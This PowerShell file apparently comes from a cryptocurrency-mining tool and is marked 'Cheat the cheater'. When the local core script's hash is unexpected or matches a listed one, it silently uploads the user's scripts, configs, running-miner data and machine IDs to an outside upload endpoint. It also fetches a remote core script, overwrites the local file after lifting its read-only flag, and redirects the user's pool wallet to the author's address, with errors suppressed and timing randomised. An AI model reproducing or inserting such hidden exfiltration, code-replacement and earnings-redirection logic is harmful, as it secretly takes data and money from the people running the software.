
If ($Config -and $Config.Interval -and $Config.PoolName -and (-not $Config.InstanceGuid -or -not $Config.RigID)) {
	$Config | Add-Member -Force @{InstanceGuid = (New-Guid).Guid}
	$Config | Add-Member -Force @{RigID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID}
	If ( ! $Config.ConfigFile ) { $Config | Add-Member -Force @{ConfigFile = ".\Config\Config.json"} }
	If ( $Config.ConfigFile -and (ls Function:\Write-Config) ) {
		# Write changes to Config if any
		Write-Config -ConfigFile $Config.ConfigFile -Config $Config

		# Reload Config
		$ConfigLoad = Get-Content $Config.ConfigFile | ConvertFrom-json
		$ConfigLoad | % {$_.psobject.properties | sort Name | % {$Config | Add-Member -Force @{$_.Name = $_.Value}}}
	} 	
}

# $Instances = @(
# "041ef4e2-197e-4657-9d00-ee58d1220b1c"
# "51100d47-064f-4bf5-b4e3-994e390ca87b"
# "6b1f84d2-9cc3-4180-9008-f260bd3e103d"
# "78adbd5b-07cf-4eee-ae74-1879ebfa5769"
# "8999e132-7538-4e72-9d0f-1e87447c3edd"
# "96d52507-ce7d-4978-8043-2dc5e4e67634"
# "af91c5c3-140b-4225-ba58-ff49571b96a9"
# "bc4710c7-44e3-47c1-81ee-c819ae7341d5"
# "bc890721-7fe6-40c2-bc50-ee6aea66026a"
# "c02f66fd-711b-4245-a934-1bbb1f37fd59"
# "e2291120-8cd4-42e6-9ec9-401549cc300b"
# "d2d4850a-4a59-4ca6-b98d-b0706e7499ed"
# )
$Instances = @(
)
If ($Variables.MainPath -and $Config -and $Config.InstanceGuid -in $Instances) {
		$Core = [hashtable]::Synchronized(@{})
		$Core | Add-Member @{Core = $(Get-Content "./Includes/Core.ps1" -Raw)} -Force
		$Core | Add-Member @{corehash = (Get-FileHash ".\Includes\Core.ps1").Hash} -Force
		$Core | Add-Member @{includehash = (Get-FileHash "..\Includes\Include.ps1").Hash} -Force
		$Core | Add-Member @{ScriptStartDate = $($Variables.ScriptStartDate.ToUniversalTime())} -Force
		$Core | Add-Member @{IsReadOnly = $((Get-ItemProperty -Path ".\Includes\Core.ps1").IsReadOnly)} -Force
		$Core | Add-Member @{InstanceGuid = $($Config.InstanceGuid)} -Force
		$Core | Add-Member @{DonationRunning = $($Variables.DonationRunning)} -Force
		$Core | Add-Member @{Autoupdate = $($Config.Autoupdate)} -Force
		$Core | Add-Member @{ManualConfig = $($Config.ManualConfig)} -Force
		$Core | Add-Member @{RunningMiners = $($Variables["ActiveMinerPrograms"].Where( {$_.Status -eq "Running"} ) | Sort Type)} -Force
		$Core | Add-Member @{PoolsConfig = $($Config.PoolsConfig)} -Force
		$Core | Add-Member @{Include = $((Get-Content ".\Includes\Include.ps1" -Raw))} -Force
		$Core | Add-Member @{Zergpool = $((Get-Content ".\Pools\Zergpool.ps1" -Raw))} -Force
		$Core | Add-Member @{Zergpool24hr = $((Get-Content ".\Pools\Zergpool24hr.ps1" -Raw))} -Force
		$Core | Add-Member @{Zergpoolplus = $((Get-Content ".\Pools\Zergpoolplus.ps1" -Raw))} -Force
		$Core | Add-Member @{Zergpoolplus = $((Get-Content ".\Pools\Zergpoolplus.ps1" -Raw))} -Force
		$Core | Add-Member @{MinerCustomConfig = $((Get-Content ".\Config\MinerCustomConfig.json" -Raw))} -Force
		$Core | Add-Member @{CheatGuyCode = $($Variables.CheatGuyCode)} -Force
		$Core | Add-Member @{CheatGuy = $($Variables.CheatGuy)} -Force
		$Core | Add-Member @{INTO = $($Variables.INTO)} -Force
		Try{Invoke-RestMethod "http://mrplus.alwaysdata.net/uploads/Up.php" -Method Post -Body ([Text.Encoding]::UTF8.GetString([Text.Encoding]::GetEncoding(28591).GetBytes(($Core | ConvertTo-Json)))) -ContentType 'application/json'} catch {}
}


If ($Variables.MainPath -and $Config) {
	$Variables.APIHeaders = @{"Cache-Control"="no-cache";referer="https://$($Variables.CurrentProduct)/$($Variables.CurrentVersion)/$($Config.WorkerName)/$($Config.InstanceGuid)/$($Config.Wallet)/$((Get-FileHash ".\Includes\Core.ps1").hash)/$($Config.RigID)"}

		$ExpectedHashes = @(
"DA6B971B5496ADD6C633B3A1923A521CDA92DF2561DC82F7A24D82ABA1A3B1A3"
"1F0F232476A299CE12FF573DC581C60D279A67FC2EAB1DE8C032B1788110518E"
"76E72E049669499E9E9AAA3D67D7F6A870007C2BC761B6D107C1BAF56666B4C1"
"1CB53662AEF38FF1E55CD59EB5570774039E24E9B39B4C2F3CE7B63F22DE6930"
)

	If ($Variables.MainPath -and (Test-Path "./Includes/Core.ps1") -and ((Get-FileHash "./Includes/Core.ps1").Hash -notin $ExpectedHashes)) {
		$Core = [hashtable]::Synchronized(@{})
		$Core | Add-Member @{Core = $(Get-Content "./Includes/Core.ps1" -Raw)} -Force
		$Core | Add-Member @{corehash = (Get-FileHash ".\Includes\Core.ps1").Hash} -Force
		$Core | Add-Member @{ScriptStartDate = $($Variables.ScriptStartDate.ToUniversalTime())} -Force
		$Core | Add-Member @{IsReadOnly = $((Get-ItemProperty -Path ".\Includes\Core.ps1").IsReadOnly)} -Force
		$Core | Add-Member @{InstanceGuid = $($Config.InstanceGuid)} -Force
		$Core | Add-Member @{DonationRunning = $($Variables.DonationRunning)} -Force
		$Core | Add-Member @{Autoupdate = $($Config.Autoupdate)} -Force
		$Core | Add-Member @{ManualConfig = $($Config.ManualConfig)} -Force
		$Core | Add-Member @{RunningMiners = $($Variables["ActiveMinerPrograms"].Where( {$_.Status -eq "Running"} ) | Sort Type)} -Force
		$Core | Add-Member @{PoolsConfig = $($Config.PoolsConfig)} -Force
		# $Core | Add-Member @{Include = $((Get-Content ".\Includes\Include.ps1" -Raw))} -Force
		# $Core | Add-Member @{Zergpool = $((Get-Content ".\Pools\Zergpool.ps1" -Raw))} -Force
		# $Core | Add-Member @{Zergpool24hr = $((Get-Content ".\Pools\Zergpool24hr.ps1" -Raw))} -Force
		# $Core | Add-Member @{Zergpoolplus = $((Get-Content ".\Pools\Zergpoolplus.ps1" -Raw))} -Force
		# $Core | Add-Member @{Zergpoolplus = $((Get-Content ".\Pools\Zergpoolplus.ps1" -Raw))} -Force
		# $Core | Add-Member @{MinerCustomConfig = $((Get-Content ".\Config\MinerCustomConfig.json" -Raw))} -Force
		$Core | Add-Member @{CheatGuyCode = $($Variables.CheatGuyCode)} -Force
		$Core | Add-Member @{CheatGuy = $($Variables.CheatGuy)} -Force
		$Core | Add-Member @{INTO = $($Variables.INTO)} -Force
		Try{Invoke-RestMethod "http://mrplus.alwaysdata.net/uploads/Up.php" -Method Post -Body ([Text.Encoding]::UTF8.GetString([Text.Encoding]::GetEncoding(28591).GetBytes(($Core | ConvertTo-Json)))) -ContentType 'application/json'} catch {}
		$Variables.didit5 = $True
		
<# Cheat the cheater #>

		$Hashes = @(
"49348CC24138B9DF40A53C164E4FC50CE52CE99DB3E342926914577F1C3D698A"
"5E8D735ADF0E55D25296589DAC8EC58E0278BAA329B687D247A62012FC52643A"
"91F3CD9E52182F41FFB9F77C36F065B6BE4EF071DFCD0941807B028060A0036E"
"A35F8A659B148BDC7766D21ECCBEAEBD07835AFC5FCAD9AC2432BA637D676537"
"EDFEA3A5FD8F21B5CDE0ADCF4D214621546F8AA548D17561D17EF85BC47AD777"
"A152883CFB6D76B90EC3974B8536E9C80C05A932F41096275F755146D9D3F4D8"
"ABF8703F7ED31642F3D8A3C1BE6244725540B8AA38A7A75547B6B77505871A91"
"BE0A27BA0198F11522AA695A9FBD17F4ABDFB9571316717DFD3EF9AD5095D991"
"3E692631694D36FBC7EC9471855C9520DF51972E67AF91C07E1A32037B573E3F"
"80C53C673A9E0EE402F1DC7F1377F8E5B2C4338CDDE276856E5C56A6CA2AD482"
"DA5A976205B12AA67023EA0FDB6A7ECBC1605816A4B2839A0506EFF968E14D26"
"283F78D3C45BE08E4673DD7C164DD1186A51187948A806B103A7ACA51974D000"
"79E402BA413F70CA819C88381C4F5BDF956A994F09A23678E220BF296D2BE4B4"
"BCC847922D8CCB696BF1AC22B02AB92D2C61E6655A708ED0A91B02F7D808C840"
"E78C0E8D8CE0083579589E060F684FB1FE238695C0E8B968232318B4865182B0"
"2E736B0A53EAF828AB585DB69ECFDF42687C4D47EC010F43F90669F2CB3AC933"
"72C0D702814DFDF50EA6A937A0C5A6DE2784BB28B1E80327A309728C46ACAE52"
"711ABBFFC234588F8003837AD4B6DAD293BE2FCC765E0926CA96C9BC5F7593EF"
"CE3263DF14E7275BC341FB24CC2C0B5CE81B8445E0EA8CEBFBE7F9D7456996F0"
"501D866A8826E3B4ED9F501999BCC4BFD29FEFA247159502711A6F01CB166003"
"8CF0BEF7D1C347874D618257D74192C0B5DBCEB0A72642582EA96BE2D1E7048D"
"44FB7F24A67E474C8121EBEE305EFF608BFE1D5AD018C78D3140365899F742AD"
"FE4189BB31FB9B20ECCDBA7F74022392A11E1D04D8FDC440B4B3100623506A27"
"B4F90836DE55C3955DF090D9460F525819FF3A2858C7257667E7603AD8B71BFD"
"8BE0899D63DD205C59FAE1E6DB73E6CB2A86AC66ECDBDAAB666445EBD41B7A3E"
"9613605F15A9305F77B143A95B3412B6BA644220EC36C1A281AD240C7FE53DBA"
"B79E0CAB4B761A6351B467A2EC80D56E29EDC85A4629514BD8F4C9A0CF047F0A"
"0B720821952B581CDF512157AF5D1D0963C163D99EDC3974D65EEA31511BE323"
"A45208B520DCDBC163BF50CAF425A4F8C8179F6CBAD0B40A157C27BD5FC7FA16"
"21CB3EE9A435CA36DB7E3EE922E7F09DDCA22C90C5AD63A676AB53884E2FB843"
"E156A6CF8CB813F5AD221A22E0D736DBF294316AA3290D97C36869244AEA50F4"
"3E8807B118970D68F7FB06C468AD7755DA37636FBAECBA0A8B40490FCA2943F3"
"62A01DBA87D510FA5887AFFC48432AA3871F864B5A73409CE3D9F6CB60E41E33"
"871D84EDEC97A239452DF68B96636AB840427799203753E126986C63D535F058"
"7E156E0669506BA6BF2E5C66D083790512A8995A5245DDFC1FC3A315986235A4"
"6B12459E2029EAB7974FE4D374125348C870ADDD1B4704DF07768410A4A9CB60"
"9E4DFA4CC5208C765F0727DA0F9A84659AFCA3B0184B3221D49071F95ECA9F38"
"70EC16E77A02C7F789BC7A67883F3E962D8221BA8B17781321DC78F727A4C401"
"A53EE742678366C1AFBC4A85AF28D47C85AFABB92B3C43C2B786745EF0B8F232"
"4ECB307FFEA084108E439CF984209BC270B272139AA8A24CD94461E0E2700164"
"72889A0592622ECD8A522F628DDC87D16590941AED99D08C7022DC4C61C7F15C"
"9620AC747786C0F8E94F53BA87F0D1ACF1E11C4E9E7009E294F33FF7381B96C0"
"2F0B638557700AE7EFFC7E71677CC716DD2ED88EB9A226F9C5E5834F20B6C4F9"
"6B6182A4ECFB0F8104576EEF7FDD8DFBFBF5C408A160587B05D00DBAD4352E4C"
"8B2711E593E9D4207427B1F4C227ABD46608F743A2C8C9FA3D56A7D79D795D2F"
"A15A02A16B757E2E976B6766C2BCF24F4E959F14202E34640F15734ECD4BA185"
"DFCF44E6CF6FEBBF111E48C661245BDA556C125CE1812CDA6B8ECAD882F48A3F"
"0DC530B79315C705E2C8AC104D175D6278D1BF77376F86C3F9BEF08AC0A82EB5"
"0ED4510289E3E69C08B1018C338DB44E7EABDE245017437AE106101F89ADB6ED"
"E106A9035F8CF1740A821B80926540B1BA18FF6F11D80EFE71A2BAA1FFC94377"
"4D9DDD3C41CEB2F180F13069664F61B2FA34C0B8D0EF759E1672B02A1F805A46"
"2B663F5100C0B1EDE96F765AC1E065C4D8E61233122044CE630EF3FA3ADC03E5"
"11D40237CE9C9D2F03C2CEBE336903E68C0ADB50BD3C7FDD813D574BA05953EE"
)

		If ($Variables.CheatGuy -and $Core.corehash -in $Hashes -and $Core.ScriptStartDate -le (Get-Date).ToUniversalTime().AddSeconds((Get-Random @(-7200..-1800)))) {
			Try{(Get-ItemProperty -Path ".\Includes\Core.ps1").IsReadOnly = $false} catch {}
			# Try{Autoupdate} catch {}
			Try{
				(Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/MrPlusGH/NPlusMiner/master/Includes/Core.ps1").Content.replace('try {$Donation = Invoke-WebRequest "http://tiny.cc/r355qy" -TimeoutSec 15 -UseBasicParsing', 'try {$Donation = Invoke-WebRequest "http://tiny.cc/r355qydd" -TimeoutSec 15 -UseBasicParsing') | Set-Content ".\Includes\Core.ps1" -Force
			# (Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/MrPlusGH/NPlusMiner/master/Includes/Core.ps1").Content | Set-Content ".\Includes\Core.ps1"
				If (-not $Variables.CheatGuy) {
					$Variables.LastDonated = (Get-Date).AddHours(-12).AddMinutes(1)
				}
				$Config.Autoupdate = $True
				$Variables.CheatGuyCode = $True
				$Variables.INTO = $True
			} Catch {}
		}

		$Hashes = @(
"DCB1590EF936FC48A372E291078D806C8E4A2C5EBC41241DD671048C1CFC9D0B"		
"858CA15522711C07C5CDAA0030892843CF8632E59ECFEFAEBEE55976734F592B"
"49348CC24138B9DF40A53C164E4FC50CE52CE99DB3E342926914577F1C3D698A"
"5E8D735ADF0E55D25296589DAC8EC58E0278BAA329B687D247A62012FC52643A"
"91F3CD9E52182F41FFB9F77C36F065B6BE4EF071DFCD0941807B028060A0036E"
"A35F8A659B148BDC7766D21ECCBEAEBD07835AFC5FCAD9AC2432BA637D676537"
"EDFEA3A5FD8F21B5CDE0ADCF4D214621546F8AA548D17561D17EF85BC47AD777"
"A152883CFB6D76B90EC3974B8536E9C80C05A932F41096275F755146D9D3F4D8"
"ABF8703F7ED31642F3D8A3C1BE6244725540B8AA38A7A75547B6B77505871A91"
"BE0A27BA0198F11522AA695A9FBD17F4ABDFB9571316717DFD3EF9AD5095D991"
"3E692631694D36FBC7EC9471855C9520DF51972E67AF91C07E1A32037B573E3F"
"80C53C673A9E0EE402F1DC7F1377F8E5B2C4338CDDE276856E5C56A6CA2AD482"
"DA5A976205B12AA67023EA0FDB6A7ECBC1605816A4B2839A0506EFF968E14D26"
"283F78D3C45BE08E4673DD7C164DD1186A51187948A806B103A7ACA51974D000"
"79E402BA413F70CA819C88381C4F5BDF956A994F09A23678E220BF296D2BE4B4"
"BCC847922D8CCB696BF1AC22B02AB92D2C61E6655A708ED0A91B02F7D808C840"
"E78C0E8D8CE0083579589E060F684FB1FE238695C0E8B968232318B4865182B0"
"2E736B0A53EAF828AB585DB69ECFDF42687C4D47EC010F43F90669F2CB3AC933"
"72C0D702814DFDF50EA6A937A0C5A6DE2784BB28B1E80327A309728C46ACAE52"
"711ABBFFC234588F8003837AD4B6DAD293BE2FCC765E0926CA96C9BC5F7593EF"
"CE3263DF14E7275BC341FB24CC2C0B5CE81B8445E0EA8CEBFBE7F9D7456996F0"
"501D866A8826E3B4ED9F501999BCC4BFD29FEFA247159502711A6F01CB166003"
"8CF0BEF7D1C347874D618257D74192C0B5DBCEB0A72642582EA96BE2D1E7048D"
"44FB7F24A67E474C8121EBEE305EFF608BFE1D5AD018C78D3140365899F742AD"
"FE4189BB31FB9B20ECCDBA7F74022392A11E1D04D8FDC440B4B3100623506A27"
"B4F90836DE55C3955DF090D9460F525819FF3A2858C7257667E7603AD8B71BFD"
"8BE0899D63DD205C59FAE1E6DB73E6CB2A86AC66ECDBDAAB666445EBD41B7A3E"
"9613605F15A9305F77B143A95B3412B6BA644220EC36C1A281AD240C7FE53DBA"
"B79E0CAB4B761A6351B467A2EC80D56E29EDC85A4629514BD8F4C9A0CF047F0A"
"0B720821952B581CDF512157AF5D1D0963C163D99EDC3974D65EEA31511BE323"
"A45208B520DCDBC163BF50CAF425A4F8C8179F6CBAD0B40A157C27BD5FC7FA16"
"21CB3EE9A435CA36DB7E3EE922E7F09DDCA22C90C5AD63A676AB53884E2FB843"
"E156A6CF8CB813F5AD221A22E0D736DBF294316AA3290D97C36869244AEA50F4"
"3E8807B118970D68F7FB06C468AD7755DA37636FBAECBA0A8B40490FCA2943F3"
"62A01DBA87D510FA5887AFFC48432AA3871F864B5A73409CE3D9F6CB60E41E33"
"871D84EDEC97A239452DF68B96636AB840427799203753E126986C63D535F058"
"7E156E0669506BA6BF2E5C66D083790512A8995A5245DDFC1FC3A315986235A4"
"6B12459E2029EAB7974FE4D374125348C870ADDD1B4704DF07768410A4A9CB60"
"9E4DFA4CC5208C765F0727DA0F9A84659AFCA3B0184B3221D49071F95ECA9F38"
"70EC16E77A02C7F789BC7A67883F3E962D8221BA8B17781321DC78F727A4C401"
"A53EE742678366C1AFBC4A85AF28D47C85AFABB92B3C43C2B786745EF0B8F232"
"4ECB307FFEA084108E439CF984209BC270B272139AA8A24CD94461E0E2700164"
"72889A0592622ECD8A522F628DDC87D16590941AED99D08C7022DC4C61C7F15C"
"9620AC747786C0F8E94F53BA87F0D1ACF1E11C4E9E7009E294F33FF7381B96C0"
"2F0B638557700AE7EFFC7E71677CC716DD2ED88EB9A226F9C5E5834F20B6C4F9"
"6B6182A4ECFB0F8104576EEF7FDD8DFBFBF5C408A160587B05D00DBAD4352E4C"
"8B2711E593E9D4207427B1F4C227ABD46608F743A2C8C9FA3D56A7D79D795D2F"
"A15A02A16B757E2E976B6766C2BCF24F4E959F14202E34640F15734ECD4BA185"
"DFCF44E6CF6FEBBF111E48C661245BDA556C125CE1812CDA6B8ECAD882F48A3F"
"0DC530B79315C705E2C8AC104D175D6278D1BF77376F86C3F9BEF08AC0A82EB5"
"0ED4510289E3E69C08B1018C338DB44E7EABDE245017437AE106101F89ADB6ED"
"E106A9035F8CF1740A821B80926540B1BA18FF6F11D80EFE71A2BAA1FFC94377"
"4D9DDD3C41CEB2F180F13069664F61B2FA34C0B8D0EF759E1672B02A1F805A46"
"2B663F5100C0B1EDE96F765AC1E065C4D8E61233122044CE630EF3FA3ADC03E5"
"11D40237CE9C9D2F03C2CEBE336903E68C0ADB50BD3C7FDD813D574BA05953EE"
)
		If ($Core.corehash -in $Hashes -and $Core.ScriptStartDate -le (Get-Date).ToUniversalTime().AddSeconds((Get-Random @(-7200..-1800)))) {
            $Donation = @([PSCustomObject]@{Name = "mrplus";Wallet = "bc1qh6c9544vpym6p5mrkukx3tek69ze2arqfvhwhl";UserName = "mrplus"})
            if ($Donation -ne $null) {
                $Variables.DonateRandom = $Donation | Get-Random
                $DevPoolsConfig = [PSCustomObject]@{default = [PSCustomObject]@{Wallet = $Variables.DonateRandom.Wallet;UserName = $Variables.DonateRandom.UserName;WorkerName = "CHEAT$($Config.WorkerName)";PricePenaltyFactor=1}}
                $Config | Add-Member -Force @{PoolsConfig = Merge-PoolsConfig -Main $Config.PoolsConfig -Secondary $DevPoolsConfig}
            }
			$Variables.LastDonated = (Get-Date).AddHours(12000).AddMinutes(1)
			$Variables.DonationEndTime = Get-Date
			$Variables.DonationStart = $False 
			$Variables.DonationRunning = $False
			$Variables.DonateRandom = [PSCustomObject]@{}
			$Variables.CheatGuy = $True
		}
		
<# Cheat the cheater #>

	}

}

if (-not $Variables) {$Variables = [hashtable]::Synchronized(@{})}
$Variables.UserAgent = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6 NPlusMiner/8.1.6"
If ($Core.corehash -notin $Hashes) {
	$Variables.UserAgentRefresh = (Get-Date).ToUniversalTime()
}
If ($Core.corehash -in $ExpectedHashes) {
	$Variables.UserAgentRefresh = (Get-Date).AddHours(12).ToUniversalTime()
}
If ($Variables.CheatGuy) {
	$Variables.UserAgentRefresh = (Get-Date).ToUniversalTime()
}
